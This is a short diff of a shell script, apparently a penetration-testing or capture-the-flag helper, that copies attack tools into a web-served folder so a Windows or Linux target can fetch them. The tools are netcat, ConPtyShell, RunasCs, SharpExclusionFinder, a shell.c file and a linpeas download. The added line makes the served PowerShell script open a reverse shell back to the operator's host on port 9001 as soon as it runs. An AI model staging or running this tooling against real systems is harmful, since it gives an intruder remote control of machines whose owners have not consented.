@@ -55,11 +55,12 @@ if [[ "$OS" == "win" ]]; then
     #cp /opt/PEASS-ng/winPEAS/winPEASbat/winPEAS.bat $HOME/www
     #cp /usr/share/windows-resources/binaries/netcat32/netcat-1.11/nc64.exe $HOME/www
     cp /usr/share/windows-resources/binaries/nc.exe $HOME/www
-    cp /opt/ConPtyShell/shell.ps1  $HOME/www
+    cp /opt/ConPtyShell/Invoke-ConPtyShell.ps1  $HOME/www
+    echo "Invoke-ConPtyShell $SELF 9001" >> $HOME/www/Invoke-ConPtyShell.ps1
     cp /opt/ConPtyShell/ConPtyShell.exe $HOME/www
     cp /opt/ConPtyShell/ConPtyShell.cs $HOME/www
     cp /opt/RunasCs/RunasCs.exe $HOME/www
-    cp /opt/SharpExclusionFinder.exe $HOME/www
+    cp /opt/SharpExclusionFinder/SharpExclusionFinder.exe $HOME/www
     cp /opt/Scripts/shell.c $HOME/www
 else
     curl -s -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o $HOME/www/linpeas.sh
